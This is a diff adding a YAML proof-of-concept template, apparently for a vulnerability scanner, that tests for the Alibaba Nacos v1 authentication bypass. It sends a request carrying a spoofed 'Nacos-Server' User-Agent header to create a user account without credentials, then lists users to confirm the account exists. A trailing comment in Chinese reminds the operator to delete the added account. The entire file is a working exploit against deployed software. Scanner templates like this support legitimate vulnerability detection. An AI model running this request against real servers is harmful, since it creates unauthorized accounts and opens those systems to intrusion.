@@ -1,0 +1,25 @@
+name: poc-yaml-alibaba-nacos-v1-auth-bypass
+set:
+  r1a: randomLowercase(16)
+  r2a: randomLowercase(16)
+rules:
+  r0:
+    request:
+      method: POST
+      path: "/nacos/v1/auth/users?username={{r1a}}&password={{r2a}}"
+      headers:
+        User-Agent: Nacos-Server
+    expression: |
+        response.status == 200 && response.body.bcontains(bytes("create user ok!"))
+  r1:
+    request:
+      method: GET
+      path: "/nacos/v1/auth/users?pageNo=1&pageSize=999"
+      headers:
+        User-Agent: Nacos-Server
+    expression: |
+        response.status == 200 && response.body.bcontains(bytes(r1a))
+expression: r0() && r1()
+detail:
+  links:
+    - https://github.com/alibaba/nacos/issues/4593 记得删除添加的账户
